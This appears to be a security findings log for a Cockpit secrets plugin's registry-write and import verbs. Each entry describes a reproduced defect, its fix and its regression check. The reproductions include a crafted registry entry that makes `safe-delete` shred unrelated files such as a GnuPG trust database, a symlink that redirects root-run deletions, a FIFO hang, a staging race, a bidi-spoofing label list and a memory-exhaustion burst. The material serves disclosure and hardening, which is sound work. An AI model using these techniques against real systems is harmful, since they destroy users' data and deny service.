and `safe-delete`, plus the per-user registry C4 introduced. Every one was reproduced before it
was fixed, every one has a regression check in `tests/integration/registry_writes.py` that was
**watched going red with the fix reverted**, and the greppable half of each is a standing ban in
`validate.sh` that was **watched firing on a deliberate violation**.

The pattern across all twelve is worth stating once, because it is not "somebody was careless".
This feature let a browser request write into the registry — the program's trust root — for the
first time. Ten of the twelve are the *old* code being asked a question it had never been asked:
`open_safe_fd` had never been pointed at a FIFO by an unprivileged user, `_shred` had never been
handed a path that was not a safe, the staging sweep had never seen a name it did not create. The
two exceptions (I43 and I50) are new code, and both are the same mistake: an invariant stated in
a docstring that the code did not enforce.

### I43 · `import-commit` proved one read of the staged file and landed a different one · Sev M · FIXED 2026-09-04
`v_import_commit` addressed the staged blob **by path, twice**: `_open_candidate(fmt, blob, …)`
opened and validated it, and `sf.read_all()` then re-opened the same path for the bytes
`_place_new_safe` wrote. No descriptor was held across the two and no digest tied them together,
and the window between them is a full KDF derivation. So the verb's entire security argument —
its own docstring says *"the only bytes that can ever become a safe are bytes that are
demonstrably a safe the uploader can already open"* — was false.

Reproduced as a real race in the hermetic lab, at uid 1000 and again at euid 0 through
`/srv/jobs`: a safe created with a deliberately expensive KDF
(`{"memory_kib":262144,"time":24,"parallelism":2}`) was uploaded, inspected, and committed with
the CORRECT passphrase in a thread; 1.2 s later — inside the derivation — the staged `blob` was
overwritten with `os.urandom(len)`.

```
commit ok=True   landed == unvalidated noise: True   landed == the validated safe: False
registry entry written: True     unlock of the registered 'safe': invalid
```

**Reach, stated honestly:** the staging directory is 0700 and owned by the euid, so on the user
path only that user can win the race (a self-attack with nothing to gain) and on the admin path
only root can — `cptest` was verified unable to `ls` a root-owned staging. The browser alone
cannot win it. What is true regardless of an adversary is that an import which reports success
could register a file that is not a safe, and that every future reader of this code would have
relied on an invariant that did not hold.

**FIXED STRUCTURALLY, not by adding a third check.** `_open_candidate` no longer accepts a path —
the signature is `(fmt, data, password, keyfile, *, mine)` — so there is nothing left to re-read
and no path to re-read it from. `v_import_commit` reads the blob **once** into `data` and hands
that same object to the validator and to `_land_new_safe`. `_header_facts` got the same treatment
(it took a path and called `probe()`, which re-opened the file a second time for facts already in
memory) and now delegates to `Backend.inspect_bytes(data)` — which also removed the `getattr`
reach into `backends.kdbx._read_header` / `_clamp_kdf` and its silently-degrading clamp. As a
belt, the digest declared at `import-begin` is re-verified at commit against the bytes that are
about to land, so "what landed is what was declared and inspected" is a statement about one array
of bytes rather than about three reads that were probably the same.

**Regression:** `registry_writes.py::section_single_read` drives the same race and asserts the
landed bytes are the validated ones, plus both signatures. Reverted (`_open_candidate` re-reading
by path), it goes red: `2 failed checks`. **Ban:** `validate.sh` requires both signatures and
allows at most ONE `read_all(` inside `_commit_staged`; both halves were watched firing.

### I44 · A registry entry naming a FIFO hung every helper invocation, forever · Sev H · FIXED 2026-09-04
`open_safe_fd`'s own docstring says step 4 is *"Regular file, or refuse. A FIFO would block the
helper forever."* That check runs **after** the `os.open`, and `open(2)` on a FIFO with no writer
blocks indefinitely — so the check that was supposed to make a FIFO safe could never run.

It became reachable when C4 handed every unprivileged user a registry they can write and the
loader started probing every per-user `path` at load time, on every verb.

```
mkfifo ~/fifo2 && chmod 600 ~/fifo2
~/.config/cockpit-secrets/safes.d/pu-fifo.json -> {"id":"pu-fifo",...,"path":"<HOME>/fifo2"}

health rc=124 elapsed=20s    list rc=124 elapsed=20s    schema rc=124 elapsed=20s   (124 = timeout)
strace: openat(AT_FDCWD, <fifo>, O_RDONLY|O_NOCTTY|O_NOFOLLOW|O_CLOEXEC) = ? ERESTARTSYS
```

`schema` is the verb the page needs to render anything at all, and `health.registry_errors` is the
supported way to find out why a safe is missing — so the plugin became permanently unusable for
that user and could not explain why, while every reload accumulated stuck processes and held
Cockpit channels. Self-inflicted today (only the user can write their own registry), which is why
it is a robustness finding and not an escalation; trivially reachable by accident.

**FIXED with one flag, in the one place every safe is opened.** `open_safe_fd` adds `O_NONBLOCK`
to the open so the call RETURNS and step 4 gets to run — and clears it with `fcntl` the moment
`S_ISREG` passes, because `read_all` and `write_all` are written against blocking semantics and
leaving the flag set would make that assumption depend on the filesystem rather than on one line.

```
health ANSWERED in 0.30s   list ANSWERED in 0.20s   schema ANSWERED in 0.21s
registry_errors: [{"file":"pu-fifo.json","error":"... (safe path is not a regular file); the entry
                   is dropped — remove <path> to clean it up"}]
```

**Regression:** `registry_writes.py::section_fifo` times out at 20 s per verb and asserts all
three answer, that the entry is dropped with a reason, and that the FIFO is untouched. Reverted,
it goes red. **Ban:** `validate.sh` requires `flags |= os.O_NONBLOCK` inside `open_safe_fd`;
watched firing when the line is deleted.

### I45 · A failed registry write left an orphan safe file and burned the id forever · Sev M · FIXED 2026-09-04
`v_safe_create` and `v_import_commit` both called `_place_new_safe` and then `_publish_entry` as
two independent statements with no `try` around the pair. Any failure of the second — a read-only
`/etc`, ENOSPC, a registry directory somebody chmodded, a `SIGKILL` in the window — left the file
on disk with nothing pointing at it.

```
chmod 500 ~/.config/cockpit-secrets/safes.d
safe-create id=orphan-one  -> {"error":"internal","detail":"the registry entry could not be written: EACCES"}
ls ~/.local/share/cockpit-secrets/safes/  -> -rw------- 1269 orphan-one.kdbx     <- it stayed
retry the same id -> conflict ("a file for that id already exists")
list -> []       safe-forget -> not-found       safe-delete -> not-found
```

The id was burned **from inside the program**: create refused it, `list` did not show it, and the
two verbs that could clean it up both need a registry entry that does not exist. For the admin
class the orphan lands in `/etc/cockpit-secrets/safes/` where only root can remove it; for an
import it is up to 128 MiB of the operator's uploaded safe. C5 rule 6 explicitly asks for the
`SIGKILL` case to be survivable, and `_atomic_json_file`'s own docstring says an operator who
created a safe and cannot find it must never have to guess whether the write tore.

**FIXED by making the pair one operation.** `_land_new_safe(ctx, safe_path, data, doc, reg_dir,
reg_name, access)` is now the ONLY function that may create a safe: it places the file, publishes
the entry, and **unlinks the file again on any failure of the publish**. It is safe to unlink
unconditionally there and nowhere else — the path was minted seconds earlier, `_refuse_conflict`
proved nothing was at it, and `_place_new_safe` created it, so the only thing that can be there is
what we just wrote. The one case that cannot be made clean is the rollback itself failing, and
that is the single place this program names a path in an error: an operator who cannot see the
orphan cannot remove it, and `health.registry_errors` will not mention it either because there is
no entry to fail to load. **The audit line still carries no path** (I15); `registry_writes.py`
asserts both halves.

**Regression:** `section_orphan` runs the failure for BOTH `safe-create` and `import-commit` and
asserts nothing is left, the id is reusable, and the retry is listed. Reverted, it goes red:
`6 failed checks`. **Ban:** `_place_new_safe` must appear exactly twice in `secrets-admin` (its
definition and one call, inside `_land_new_safe`); watched firing.

### I46 · `_KNOWN_KEYS` omitted the three provenance keys, so the shipped examples were silently dropped · Sev M · FIXED 2026-09-04
`origin`, `created_utc` and `source` were declared in `schema/safe-registry.schema.json`,
documented in `docs/CONTRACT.md` as the record a created or imported safe carries, and shipped in
`etcdefaults/30-example-created.json`, `40-example-imported.json` and
`user-safes.d/50-example-personal.json` — and `validate_entry`'s `_KNOWN_KEYS` did not list them.
`validate_entry` runs BEFORE the jsonschema gate and drops an entry with an unknown key.

```
cp etcdefaults/30-example-created.json <etc>/safes.d/
health.registry_errors -> [{"file":"30-example-created.json","error":"unknown key 'created_utc'"}]
list -> []
```

So an operator following the shipped documentation and the shipped examples wrote an entry that
`jsonschema` accepted, `install.sh`'s validation loop passed, and the helper discarded — the exact
outcome the code's own comments say must never happen. The second half was worse: **nothing ever
wrote them**, so `CONTRACT.md`'s account of provenance described a record that did not exist, and
the "this program made this file" reassurance that makes a `safe-delete` confirmation feel
reasonable had no data behind it.

**FIXED in one change, both halves.** `_KNOWN_KEYS` gained the three names with full type checks
(`_sub_source` validates the `source` block to the same shape the schema declares, including the
`additionalProperties:false` on `kdf_params` — a parameter the writer has no key for is DROPPED
rather than written, because writing one makes the whole entry fail its next load). `_registry_doc`
now writes `origin: "created"|"imported"` and an RFC-3339 `created_utc`, and `import-commit`
writes a `source` block built from what `import-inspect` actually SHOWED the operator before they
typed a passphrase — not from a fresh parse — carrying `sha256_at_import`, `cipher`, `kdf`,
`format_version`, `kdf_params` and `bytes`.

**Regression:** `section_provenance` copies the shipped examples in and asserts zero registry
errors, then asserts what create and import write, then plants four malformed provenance keys and
asserts each drops the entry. **Ban:** `tests/ban_registry_vocabulary.py` compares `_KNOWN_KEYS`
with the schema file's `properties` in BOTH directions and is run by `validate.sh`; watched firing
when the three names are removed. That gate is what makes this a class of bug that cannot recur.

### I47 · `safe-delete` shredded any file a registry entry named, and swept any directory `backup.dir` named · Sev H · FIXED 2026-09-04
`docs/CONTRACT.md` stated the gate in two places — *"the entry's `path` must equal the path this
program would mint for this id and access class today"* and *"a hand-registered safe can only be
forgotten"* — and the code did not have it. `v_safe_delete` resolved the registry `path` and
shredded whatever was there, without ever opening it through a backend.

C4 deliberately gives every unprivileged user a registry they can write, so the entry is a thing
they can produce with `cat >`:

```
512 bytes of /dev/urandom at ~/.gnupg/trustdb.gpg, declared {"format":"psafe3","path":...}
safe-delete -> {"ok":true,"file_removed":true,"bytes":512,"overwritten":true}
the file was overwritten with random bytes and unlinked. It was never a safe of any format.
```

And the ring sweep amplified it: a REAL safe whose entry pointed `backup.dir` at `~/docs` had
`taxes.pdf`, `keys.txt` and `notes.md` all shredded by one delete, with the confirmation token
naming only the safe id and the swept directory never shown to the operator. Because the audit
line is by id — correctly (I15) — nothing anywhere recorded what was destroyed.

**FIXED with the gate the contract already specified, plus the same derivation for the ring.**
`_minted_path_or_refuse()` asks `_mint` what path this id and access class would produce TODAY and
requires the entry's own path to equal it exactly. It reads the **id**, not `origin`: a hand-edited
provenance key must not be able to talk the helper into an unlink, so `origin` corroborates and
does not authorise. `_delete_ring()` derives the ring from the minted path
(`backup_dir_for(path, None)`) and removes only files named like a generation
(`<basename>.<stamp>.<pid>.bak`); a ring at a registry-supplied `backup.dir` is **not** swept and
the response says so in a warning, because leaving copies quietly would be the other half of the
same lie.

The intended consequence: **a hand-registered safe can only be forgotten.** Its file is somewhere
an administrator chose, this program did not put it there, and removing it is `rm`.

**Regression:** `section_delete_gate` — a hand-registered file survives a delete byte-for-byte and
is still forgettable; a registry `backup.dir` is not swept and the warning says so; the derived
ring's own generations ARE destroyed and the two foreign files beside them are not. Reverted, it
goes red: `5 failed checks`. **Bans:** `validate.sh` requires
`path = _minted_path_or_refuse(entry, ctx)` and `backup_dir_for(safe_path, None)` inside
`_delete_ring`; both watched firing.

### I48 · `safe-delete` destroyed the file BEFORE unregistering it, and reported the whole thing refused · Sev H · FIXED 2026-09-04
The order was: shred the safe, shred the ring, then unlink the registry entry. When the registry
unlink failed — a normal root-owned `safes.d` an unprivileged caller cannot write, which is the
documented per-user `%u` pattern — the caller was told `access-denied` **after** everything was
already gone.

```
<etc>/safes.d/uclass.json with access:"user" pointing at a file the caller owns 0600
chmod 555 <etc>/safes.d
safe-delete -> {"error":"access-denied","detail":"this caller may not write to the registry directory"}
<HOME>/mysafes/ is EMPTY                 <- already shredded and unlinked
<etc>/safes.d/uclass.json untouched      <- still registered
list -> ('uclass', usable=True, reason='')
```

The most destructive verb in the program reported the operation as REFUSED after it had
irreversibly destroyed the safe and its entire backup ring — the only undo the program has (I12).
The operator believed nothing had happened, `list` still said usable, and the loss surfaced at the
next unlock with the ring already gone. That is the worst direction for a partial failure to fail
in.

**FIXED by reversing the order.** `v_safe_forget` runs FIRST; only after the registry edit has
committed does anything get shredded. Past that line a failure can only leave MORE of the safe
than the operator asked for, never less than they were told — which is `safe-forget`'s outcome and
a state the operator can act on.

**Regression:** `section_delete_order` makes the registry unwritable, asserts the refusal, and then
asserts the safe file is byte-identical, still unlocks, and is still listed as usable — which is
now a TRUE statement. Reverted, it goes red: `3 failed checks`. **Ban:** `validate.sh` requires
the `v_safe_forget(` call to appear before the first `_shred(path)` inside `v_safe_delete`;
watched firing.

### I49 · `safe-delete` checked a confirmation field its own schema does not declare · Sev M · FIXED 2026-09-04
`v_safe_delete` read `req.get("confirm")` — the `export` verb's field name — while the `schema`
verb published `delete_confirm`, `docs/CONTRACT.md` documented `delete_confirm`, and `secrets.js`
sent `delete_confirm`.

```
schema: safe-delete request = ['safe', 'delete_confirm']    "is 'confirm' declared?" -> False
delete_confirm (schema-declared) -> access-denied, file still present
confirm        (undeclared)      -> ok:true,      file gone
```

Through the interface the schema publishes — the only one `secrets.js` builds its form from and
the only one `CONTRACT.md` documents — `safe-delete` could **never succeed**. C8's destructive half
was dead on arrival, so the trap C8 exists to close was only half shut. It is fail-closed, so not
an escalation; but the gate an operator types was not the gate the code checked, and the obvious
fix at the caller would have left the two permanently out of sync.

**FIXED at the code (`delete_confirm`), because the schema and the contract are the authority for
request fields.** The generalisation matters more than the one-line change:
`tests/ban_undeclared_fields.py` is a new standing gate that walks `secrets-admin`'s AST, builds a
call graph, and refuses any verb that can reach a `req.get("x")` its own published request does not
declare. It found four more, all real: `backups`, `breach-check`, `restore-backup` and `export`
all accept a session `handle` through `_entry_for` and none of them declared it — a working
capability no conforming client could use. All four now declare `handle`, and the capability was
verified working inside a real `open` session afterwards.

**Regression:** `section_confirm_field` asserts the schema's declaration, that the declared field
deletes, that the old spelling does not, and that eight malformed confirms are refused with the
safe intact. Reverted, it goes red: `13 failed checks`. **Bans:** the exact
`confirm = req.get("delete_confirm")` line, and `ban_undeclared_fields.py`; both watched firing —
the AST ban was tested by adding a `req.get("undeclared_field_xyz")` to a verb.

### I50 · The pre-commit import steps ACCEPTED a credential and silently ignored it · Sev M · FIXED 2026-09-04
C5 makes the ordering — bytes first, passphrase last — a requirement of the **helper**, not of the
UI. `import-begin`, `import-chunk` and `import-inspect` never READ a credential, which is not the
same as refusing one: they accepted `password`, `new_password`, `keyfile_b64` and `passphrase` and
answered `ok`. The shipped `ui_rules` string told clients a rule the server did not enforce.

```
import-begin  + {"password":"CANARY","new_password":"CANARY","keyfile_b64":"..."} -> ok:true
import-chunk  + {"new_password":"CANARY"}                                          -> ok:true
import-inspect+ {"new_password":"CANARY","password":"CANARY"}                      -> ok:true
```

So the one guarantee the brief calls *"a requirement, not a preference"* lived entirely in
`secrets.js`. Any other client — or a regression in the page's step ordering, or a future generic
request serializer — could collect the passphrase in the file-picker step and ship it with
`import-begin` and with all 256 chunk frames of a 128 MiB upload. That is exactly the browser-memory
window I11 and I14 exist to shrink, re-opened with nothing on the server side saying no.

**FIXED IN THE DISPATCHER, not in the three verbs.** `_refuse_undeclared_credential(verb, req)`
runs inside `run_verb` for every verb, and its allow-list is **each verb's own declared request in
the `schema` document** — so a new verb that declares no secret field gets the refusal without
anybody adding a line, which is the same reasoning that put `verify_own_output` where it is. The
refusal is `invalid` and names the field, because the caller is a program and naming a key it sent
is not a disclosure. `_CREDENTIAL_ALIASES` covers spellings this program does not publish
(`passphrase`, `keyfile`, …) so "the helper did not recognise the key" is never the reason a
credential is accepted somewhere it must not be.

Two consequences worth recording. The guard exposed that `backups`, `breach-check`,
`restore-backup` and `export` accepted an undeclared `handle` (see I49) — they now declare it, and
the capability still works. And `tests/integration/flow.py`'s class-gate sweep was sending
`password` to every verb; it now builds each request from that verb's own declared fields, which
is the stronger version of the same check and took it from 88 to 115 passing assertions.

**Regression:** `section_precommit_credentials` asserts all four credential spellings are refused
by name on all three verbs, that a clean flow still works end to end, that the guard is generic
(`probe` + `password` is refused too), and that a verb which DOES declare one still accepts it.
Reverted, it goes red: `13 failed checks`. **Ban:** `_refuse_undeclared_credential(verb, req)` must
appear exactly twice (definition plus the call inside `run_verb`) — the first version of this ban
grepped for the name alone and PASSED with the call replaced by `pass`, because the definition
line spells it the same way; that was caught by running the control and is why the ban counts.

### I51 · `safe-forget` reported success while the safe stayed registered · Sev L · FIXED 2026-09-04
With two registry files in one directory declaring the same id, `v_safe_forget` unlinked the
`registry_file` the winning entry came from and returned `{"ok":true,"forgotten":…}`. The loser was
promoted on the next load.

```
list before -> ['esc-e']    safe-forget -> {"ok":true,"forgotten":"esc-e"}
directory after -> 00-alias.json still present
list after -> STILL LISTED: ['esc-e']
```

The verb C8 exists to provide reported that it had done its job and had not. The operator believes
a safe is unregistered while it remains fully reachable — including by `unlock`, and with whatever
`path`, `access` and `mode` the surviving duplicate declares, which need not match the one they
inspected. Reachable in the system registry too.

**FIXED by making the loader carry the whole list.** `_read_registry_dir` records
`entry["registry_files"]` — every file that declared this id, not just the winner — and
`safe-forget` REFUSES with a `conflict` naming all of them. Refusing is the only honest answer:
unlinking one of two would report success and leave the safe registered, and unlinking both would
destroy a second entry the operator never named. `safe-delete` inherits the refusal through
`safe-forget`, so a duplicated id cannot be destroyed either.

**Regression:** `section_forget_duplicates`. Reverted (`dupes = []`), it goes red: `5 failed
checks`. **Ban:** the loader's recording line and forget's reading line, both pinned exactly — the
first version of this ban passed with the recording line replaced by `pass`, because the same key
appears again in the duplicate branch.

### I52 · `safe-create` accepted bidi-override and zero-width characters in `label` · Sev L · FIXED 2026-09-04
`_new_label` rejected only C0 controls and `0x7f`. `schema/safe-registry.schema.json` says of
`label`: *"Set it wrong and an operator picks the wrong safe out of the list, which is how a
passphrase gets typed into the wrong prompt."* Labels reach the DOM via `textContent`, so U+202E is
applied by the browser's bidi algorithm and the visible string is not the stored one.

**Reach, stated plainly:** a per-user label is shown only in that user's own list (a root helper
never reads the per-user registry — verified), and an admin-class label requires already being an
administrator, so this is not a cross-privilege spoof. It matters because 0.4.0 is the first
release in which a label reaches the registry from a browser form at all.

**FIXED by refusing, not stripping** — silently altering an operator's label means the name in the
list is not the name they typed. `_LABEL_SPOOF_CHARS` names the bidi overrides and isolates
(U+202A–202E, U+2066–2069) and the zero-width set (U+200B–200F, U+FEFF), and a `unicodedata`
category `Cf` sweep catches the ones nobody thought of — naming only the known ones is how the
next one gets through.

**Regression:** `section_label_spoofing` refuses seven hostile labels (written as `\u` escapes in
the test source, because a file carrying a literal U+202E reverses itself in the reviewer's editor)
and accepts five legitimate ones including accents, an en dash and Japanese — a refusal that
catches everything is an outage, not a fix. Reverted, it goes red: `12 failed checks`. **Ban:** the
`Cf` sweep line; watched firing.

### I53 · The start-up staging sweep followed a symlink named like a staging token · Sev L · FIXED 2026-09-04
`_sweep_staging` accepted any name matching `^[0-9a-f]{32}$`, aged it with `os.stat` — which
follows symlinks — and `_staging_destroy` then unlinked `blob` and `meta.json` **by path**. So a
symlink named like a token had its TARGET's two files removed, on every helper invocation,
including at euid 0.

```
<state>/import/bbbb…bb -> a directory outside the staging root
before: ['blob','keepme','meta.json']   after: ['keepme']
the symlink itself survives (rmdir on a symlink fails), so the attempt repeats every invocation
```

This is a real deviation from `_staging_destroy`'s own stated discipline — it argues the flat
two-unlink form is safer than a tree walk *because* "the only thing that should be in it is what we
put there". Not reachable by an adversary the threat model cares about: the staging root is 0700
and owned by the euid (verified 0700 root:root on the admin path, with `cptest` denied `ls`), so
planting the symlink is a self-attack. It is a hardening gap in the one function that runs as root
on every single invocation and deletes by path.

**FIXED in both places.** `_sweep_staging` uses `os.lstat` and skips anything that is not a
directory — and leaves it alone rather than removing it, because this function's remit is stale
stagings and "something unexpected is in here" must not become "delete whatever is in here".
`_staging_destroy` opens the token directory `O_NOFOLLOW|O_DIRECTORY` and unlinks **through that
dirfd**, so a symlink is the thing that is refused rather than the thing that is traversed.

**Regression:** `section_sweep_symlink` plants the symlink, ages it ten days, runs an unrelated
verb, and asserts the target is intact — with a positive control that a REAL stale staging in the
same directory IS swept. Reverted, it goes red. **Bans:** `os.lstat(d)` in the sweep and
`dir_fd=dirfd` in the destroy; both watched firing.

### I54 · Nothing bounded how many `import-inspect` / `import-commit` calls ran at once · Sev M · FIXED 2026-09-04
Every other import limit counts things a caller may HOLD — `IMPORT_MAX_STAGINGS`,
`IMPORT_MAX_ATTEMPTS`, `MAX_SAFE_BYTES`. None counted things RUNNING, and each helper invocation is
its own process.

```
single import-inspect on a 128 MiB staging : wall 0.57 s, peak RSS 299 MiB  (2.33x the file)
8 stagings x 128 MiB, 8 concurrent inspects: 1.05 s, aggregate secrets-admin RSS 2,329 MiB
32 concurrent inspects against ONE staging : 2.89 s, peak aggregate RSS 7,576 MiB
```

7.58 GiB of resident memory across 32 helper processes — every one of them euid 0 on the admin
path — from a single 128 MiB file, in under three seconds, with no error and no throttle. What
`import` adds over `unlock`, which has the same per-request shape, is that the caller supplies the
large input themselves and needs neither a registered safe nor an administrator to do it.

**FIXED with a non-blocking work slot.** `_ImportWorkSlot` takes `flock(LOCK_EX|LOCK_NB)` on one of
`IMPORT_MAX_CONCURRENT` (2) slot files inside the staging root — which is already 0700 and owned by
the euid, so the slots are per-identity by construction and one user cannot exhaust another's. It
**refuses rather than queues**: a caller queued behind two 128 MiB inspections is a Cockpit channel
held open for the duration, and `conflict` is a retryable code the UI already knows. The lock dies
with the process, so a SIGKILLed helper does not leak a slot the way a counter file would.

The per-request factor also halved as a side effect of I43's single read: after the fix a repeat
inspect of the same 128 MiB staging measures **42–44 MiB peak RSS** against a ~40 MiB baseline,
because the second full read that `probe()` was doing is gone.

`secrets.js` retries a `conflict` at the inspect step up to four times with a short wait before it
gives up, because the wizard's failure path destroys the staging — and re-uploading 128 MiB because
two operators clicked at the same moment is the same class of bug as re-uploading it because of a
typed passphrase.

**Still not bounded, and recorded rather than fixed:** `unlock` on a large REGISTERED safe has the
same per-request shape and never had a cap either. See `docs/RESIDUAL-RISK.md`.

**Regression:** `section_concurrency` fires `import_max_concurrent + 6` simultaneous inspects and
asserts some are refused, every refusal is a retryable `conflict` and never an `internal`, the
staging SURVIVES a refusal (it is a throttle, not a destroy), and the commit still works
afterwards. Reverted, it goes red. **Ban:** `with _ImportWorkSlot(` must appear in BOTH
`v_import_inspect` and `v_import_commit` — the first version grepped the whole file and passed with
one of the two removed.

### I55 · A safe created at a reused id inherited the deleted one's lockout · Sev L · FIXED 2026-09-04
Found while cleaning the host after the live walkthrough, and only because that was the first
thing in this project's history to delete a safe and then reuse its id.

I16's counter is keyed on **(real uid, safe id)** — correctly (I40) — and until 0.4.0 an id was
never freed from inside this program, so a counter and the safe it counted for had the same
lifetime and nothing had to say so. `safe-delete` broke that silently:

```
safe-create id=reuse                       ok
six wrong guesses                          bad-credential ×2, locked-out ×4
  fail.1000.reuse.json -> failures 2, locked_until in the future
safe-delete reuse                          ok  (file and ring destroyed)
  fail.1000.reuse.json -> failures 2, STILL ARMED
safe-create id=reuse                       ok
unlock reuse WITH THE PASSPHRASE JUST CHOSEN
  -> {"error": "locked-out",
      "detail": "too many failed unlock attempts for this safe; try again in 2 seconds"}
```

An operator makes a safe, types the passphrase they chose ten seconds ago, and is told there
have been too many failed attempts on it. It is a self-inflicted denial of service and its
worst case is bounded by `LOCKOUT_MAX_SECONDS` — hence Low — but it is the kind of message that
makes somebody distrust the whole program.

The same state is reachable without `safe-delete`: forget the entry, remove the file by hand,
create the id again.

**FIXED at both routes, in `_land_new_safe` and in `v_safe_delete`.** Putting it in
`_land_new_safe` rather than in `safe-create` and `import-commit` separately is the usual rule
here — an import cannot get it and a create forget it. It is safe to clear at that point
because reaching it means the class gate passed and `_refuse_conflict` proved the id was free,
so any counter under it is about a safe that no longer exists.

`lockout_reset` **zeroes rather than unlinks**, which is its own documented discipline and not a
compromise: `flock` is held on an inode, and unlinking a counter other helpers are queued on
hands the next arrival a different inode with the same name — I39 reached from the one code
path allowed to make the counter smaller. So a 60-byte zeroed file remains, deliberately.

**Regression:** `registry_writes.py::section_reused_id` drives BOTH routes —
delete-then-create and forget-remove-create — and requires the brand-new safe to open with the
passphrase just chosen. Reverted, both go red with `locked-out`. **Ban:** `validate.sh` requires
the `lockout_reset` call in `_land_new_safe` AND in `v_safe_delete`; reverting either fires it,
watched.


---

## The 0.5.0 restyle — the five its own verification said were still wrong

Recorded as hazards rather than as changelog lines because each one is a defect that shipped,
each was found by a measurement the previous round did not make, and each now has a check that
goes red without its fix. **All five are closed in 0.5.1 and every closure below names its
evidence.** The design-side narrative is `docs/DESIGN.md` §18.1, §18.3, §18.9 and §18.10.

### I56 · R5 shipped as dead code — `list` published no `path` · Sev L · FIXED 2026-09-06 (0.5.1)
The safes table's optional **Path** column and the details pane's always-visible **Path**
section were both written correctly and were both unreachable, because the field they are
guarded on did not exist. `optColAvailable()` offers the column only when some row carries
`path`; the pane's section is behind `if (safe.path)`. The `list` verb's declared response
named fifteen keys and `path` was not among them, at either access level.

This is a **disclosure-shaped defect read the wrong way round**: the requirement exists so an
operator can find the file a safe is, and its absence meant a safe you cannot locate on disk —
cannot back up, cannot repair, cannot prove is the one you meant.

**FIXED in the helper.** `v_list` publishes `path` from `resolve_entry(entry, ctx.ident)["path"]`
— the same resolution the open path uses, so there is no second source of truth and `%u` is
expanded from kernel identity, never from the request. The schema declares it.

**The obvious fix was the wrong one, and that is recorded because it passed every offline
gate.** `docs/DESIGN.md` §18.1 prescribed publishing it "gated on access class". Built that
way it passed every unit and integration check and then failed live for exactly the safe the
requirement was written about: `secrets.js` spawns `list` with **no superuser option, always**
(the verb matrix — `list` names what exists; whether a safe may be OPENED is decided per verb),
so the euid asking is never root and a class gate refuses every admin-class row at both access
levels. The gating was withdrawn and §18.1 corrected.

**Why publishing it is safe, measured rather than argued:** `list` runs at the caller's own
euid, and a registry file that euid cannot open is recorded as a registry error and never
becomes a row (`chmod 000` over an entry → `unreadable (EACCES)`, id gone from `list`). The
system registry is 0644 root-owned policy any account can already read; the per-user registry is
only ever read out of the caller's OWN home. Every row therefore came from a file the caller
could already read, and `path` is a field of that file. The residual disclosure — a home
directory names an account, and this page gets screenshotted — is what the off-by-default
column answers.

**Regression:** `tests/browser/live-ui.spec.js` **item 11**, which drives a system-registry
safe and a per-user one in one escalated session: the column is absent on first load, neither
published path appears anywhere in the default table, the chooser offers the box, ticking it
shows both values in full, the choice survives a sort in both directions, and the pane shows
each path in full, selectable and wrapping. `tests/browser/ui.spec.js` covers the same shape
under the stub harness. **Watched failing:** the pre-change helper (sha `68d62ca4…`) was
temporarily installed and the live page re-driven — *any row has path* false, Path checkbox not
offered, pane sections `["File header"]` only.

### I57 · `install.sh` deleted `theme.js` from the installed package on every run · Sev L · FIXED 2026-09-06 (0.5.1)
`PLUGIN` is three things at once — the copy list, the stale-file sweep, and the payload-present
pre-flight — and `theme.js` was added to `index.html` and not to `PLUGIN`. So section 1 copied
five files and the sweep immediately after it deleted the fifth, on every single run, while the
same script's pre-flight syntax-checked the file it was about to remove.

The comment in `index.html` claimed the missing file "404s silently". It does not: Cockpit
answers with an HTML error page and Chromium logs `Refused to execute script … because its MIME
type ('text/html') is not executable` on **every page load** — a permanent console error on
every installed host, and the one cause of `live-ui.spec.js` item 1's failure.
`securitypolicyviolation` events: **0**, so it was never a policy problem.

**The theme itself was never affected** — `secrets.js` carries a guarded second copy of the
resolver — but that copy is deferred behind 476 KB and therefore cannot deliver §3.3's
"no flash by construction". Measured with `secrets.js` delayed 3 s: absent, the frame paints at
161 ms with `<html class="">` and the fallback does not run until 3068 ms; served, the class is
on `<html>` at 141 ms before the 169 ms paint.

**FIXED** by adding `theme.js` to `PLUGIN` **and** by a new pre-flight gate that parses
`index.html` with `html.parser`, collects every attribute that makes the browser fetch a second
file from the package directory, discards anything with a scheme, an authority, an absolute
path or a parent segment, and **dies** if a package-local reference is not in `PLUGIN`. It
refuses rather than warns, because a warning is exactly what the previous round produced and
nobody acted on.

**Regression:** the gate itself — run against an `index.html` referencing a file `PLUGIN` does
not carry, it exits 1 naming the file and the element; edge cases (`../base1/cockpit.js`, an
absolute `/base1/x.js`, an `https://` CDN, a `data:` URI, a subdirectory reference) exercised
separately. `tests/root/20-verify-install.sh` asserts the installed payload equals `PLUGIN`,
**derived from `install.sh` rather than restated** — the four-name copy it used to carry is
what made this hard gate fail the release that legitimately grew the payload, and is itself
part of what was fixed here.

**Evidence of closure:** on the installed page, driven through the real shell as `cptestadm`,
**0 console errors from the package and 0 `securitypolicyviolation` events**, with all package
resources answering 200; a second `install.sh` run reports `= unchanged
/usr/share/cockpit/secrets/theme.js` and the directory still lists five files, which is the
proof the copy list and the sweep now agree.

### I58 · The entries table broke words mid-word at the default docked width · Sev L · FIXED 2026-09-06 (0.5.1)
Found by **looking at a screenshot**; no numeric check caught it, because nothing overflowed
and the page did not scroll. At a 1400px window with the pane docked the entries table sat at
its `min-inline-size: 42rem` floor inside a 504px scroller, seven columns at ~96px each, with
`overflow-wrap: anywhere` on every cell — so the first row rendered **26 lines / 552px** tall
and `ada.lovelace`, a twelve-character string, was broken mid-word in a **103px** column.

Two separable causes, both fixed:

* **the floor was too low.** 42rem → **60rem**, derived and not chosen: 7 × 2rem of cell padding
  the sheet already spends (14rem), plus the six columns that may not break a word at their
  longest unbreakable token (160+144+107+37+78+161 px ≈ 43rem), plus one line for URL (3rem).
  Checked against reality: the table's own min-content measures 944px, so the 960px floor sits
  just above it and the two rules agree rather than one silently overriding the other.
* **`overflow-wrap: anywhere` was applied too widely.** `table.sec td` is now `break-word`,
  which contributes the whole word to min-content so the layout must give the column its
  longest word — the two values are not cosmetically equivalent, and that difference is the
  whole fix. `anywhere` is re-applied to exactly two places: the URL column, whose testbed
  token measures 2126px, and `#sec-safes table.sec td .mono` (Path and Id).

The URL rule is addressed by POSITION (`td:nth-child(3)`) because the renderer writes a bare
`<td>`. That coupling is **pinned**: `live-ui.spec.js` item 10 asserts the third header reads
"URL" and that its cells resolve `anywhere` while Username resolves `break-word`, so a
reordering schema fails loudly. The clean fix is one class in `renderEntries()` and is left
open.

**Result:** table 672 → 960px, Username 96 → 176px, first row 26 → 9 lines.
**Regression:** `live-ui.spec.js` item 10's width half, at four widths. **Watched failing:** a
reverted `secrets.css` was installed and the unchanged suite run — 118/123, item 10 FAIL, the
reverted run reporting the Username column at 103px.

